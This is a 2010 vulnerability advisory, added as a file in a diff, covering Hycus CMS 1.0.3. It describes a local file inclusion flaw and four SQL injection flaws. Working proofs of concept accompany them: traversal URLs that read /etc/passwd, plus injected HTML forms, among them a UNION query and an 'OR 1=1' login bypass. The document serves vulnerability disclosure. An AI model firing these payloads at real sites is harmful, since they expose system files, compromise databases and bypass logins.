@@ -1,0 +1,72 @@
+Vulnerability ID: HTB22737
+Reference: http://www.htbridge.ch/advisory/lfi_in_hycus_cms.html
+Product: Hycus CMS
+Vendor: Hycus Web Development Team ( http://www.hycus.com/ ) 
+Vulnerable Version: 1.0.3
+Vendor Notification: 07 December 2010 
+Vulnerability Type: LFI
+Status: Not Fixed, Vendor Alerted, Awaiting Vendor Response
+Risk level: High 
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/) 
+
+Vulnerability Details:
+The vulnerability exists due to failure in the "/index.php" and "admin.php" scripts to properly sanitize user-supplied input in "site" variable.
+
+The following PoC is available:
+
+http://[host]/index.php?site=../../../../../../../etc/passwd%00
+http://[host]/admin.php?site=../../../../../../../etc/passwd%00
+
+
+Vulnerability Details:
+The vulnerability exists due to failure in the "/index.php" script to properly sanitize user-supplied input in "useremail" variable.
+Attacker can alter queries to the application SQL database, execute arbitrary queries to the database, compromise the application, access or modify sensitive data, or exploit various vulnerabilities in the underlying SQL database.
+
+The following PoC is available:
+
+<form action="http://[host]/?user/1/forgotpass.html" method="post" name="main" >
+<input type="hidden" name="useremail" value="1'SQL_CODE"/>
+<input type="submit" value="submit" name="submit" />
+</form>
+
+
+
+Vulnerability Details:
+The vulnerability exists due to failure in the "/index.php" script to properly sanitize user-supplied input in "q" variable.
+Attacker can alter queries to the application SQL database, execute arbitrary queries to the database, compromise the application, access or modify sensitive data, or exploit various vulnerabilities in the underlying SQL database.
+
+The following PoC is available:
+
+<form action="http://[host]/?search/1.html" method="post" name="main" >
+<input type="hidden" name="q" value="search' union select 1,2,@@version -- 3"/>
+<input type="submit" value="submit" name="submit" />
+</form>
+
+
+Vulnerability Details:
+The vulnerability exists due to failure in the "/index.php" script to properly sanitize user-supplied input in "user_name" and "usr_email" variables.
+Attacker can alter queries to the application SQL database, execute arbitrary queries to the database, compromise the application, access or modify sensitive data, or exploit various vulnerabilities in the underlying SQL database.
+
+The following PoC is available:
+
+<form action="http://[host]/?user/1/hregister.html" method="post" name="main" >
+<input type="hidden" name="full_name" value="username"/>
+<input type="hidden" name="user_name" value="1'SQL_CODE"/>
+<input type="hidden" name="usr_email" value="test@mail.com'SQL_CODE"/>
+<input type="hidden" name="pwd" value="123456"/>
+<input type="hidden" name="pwd2" value="123456"/>
+<input type="submit" value="submit" name="submit" />
+</form>
+
+
+Vulnerability Details:
+The vulnerability exists due to failure in the "/index.php" script to properly sanitize user-supplied input in "usr_email" variable.
+Attacker can alter queries to the application SQL database, execute arbitrary queries to the database, compromise the application, access or modify sensitive data, or exploit various vulnerabilities in the underlying SQL database.
+
+The following PoC is available:
+
+<form action="http://[host]/?user/1/hlogin.html" method="post" name="main" >
+<input type="hidden" name="usr_email" value="1' OR 1=1 -- 1"/>
+<input type="hidden" name="pwd" value="any"/>
+<input type="submit" value="submit" name="submit" />
+</form>
